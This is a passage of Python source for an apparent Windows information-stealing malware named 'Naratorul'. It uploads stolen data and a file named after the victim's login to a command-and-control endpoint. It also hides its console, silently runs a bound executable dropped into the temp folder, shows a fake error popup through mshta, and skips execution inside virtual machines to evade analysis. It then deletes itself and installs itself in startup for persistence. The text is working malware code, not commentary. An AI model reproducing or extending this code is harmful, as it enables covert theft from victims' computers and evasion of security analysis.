            http = PoolManager(cert_reqs='CERT_NONE', headers={'User-Agent': random.choice(['Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Mozilla/5.0 (Windows NT 10.0; rv:109.0) Gecko/20100101 Firefox/115.0'])})
            fields = {'payload_json': json.dumps(payload).encode()}
            if 'file_data' in locals():
                fields['file'] = ("Naratorul-%s.%s" % (os.getlogin(), ext), file_data)
            resp = http.request('POST', Settings.C2[1], fields=fields)
        except:
            pass

if os.name == 'nt':
    if Settings.HideConsole:
        Syscalls.HideConsole()

    if not Syscalls.CreateMutex(Settings.Mutex):
        os._exit(0)

    if hasattr(sys, '_MEIPASS') and Settings.RunBoundOnStartup and os.path.isfile(os.path.join(sys._MEIPASS, 'bound.blank')):
        try:
            bound_src = os.path.join(sys._MEIPASS, 'bound.blank')
            bound_dst = os.path.join(os.getenv('temp'), 'bound.exe')
            if os.path.isfile(bound_dst):
                os.remove(bound_dst)
            with open(bound_src, 'rb') as f:
                data = f.read()
            dec = zlib.decompress(data[::-1])
            with open(bound_dst, 'wb') as f:
                f.write(dec)
            subprocess.Popen('start "%s"' % bound_dst, shell=True, cwd=os.path.dirname(bound_dst), creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except:
            pass

    if hasattr(sys, '_MEIPASS') and Settings.FakeError[0]:
        try:
            title = Settings.FakeError[1][0].replace('"', '\\x22').replace("'", '\\x22')
            msg = Settings.FakeError[1][1].replace('"', '\\x22').replace("'", '\\x22')
            icon = int(Settings.FakeError[1][2])
            cmd = 'mshta "javascript:var sh=new ActiveXObject(\'WScript.Shell\'); sh.Popup(\'%s\', 0, \'%s\', %s+16);close()"' % (msg, title, icon)
            subprocess.Popen(cmd, shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
        except:
            pass

    if not Settings.Vmprotect or not VmProtect.isVM():
        if hasattr(sys, '_MEIPASS') and Settings.Melt and not Utility.IsInStartup():
            Utility.HideSelf()
        elif Settings.Melt:
            Utility.DeleteSelf()

        if hasattr(sys, '_MEIPASS') and Settings.Startup and not Utility.IsInStartup():
            path = Utility.PutInStartup()
            if path:
                pass

        try:
            Naratorul()
        except:
            pass

        if hasattr(sys, '_MEIPASS') and Settings.Melt and not Utility.IsInStartup():
            Utility.DeleteSelf()
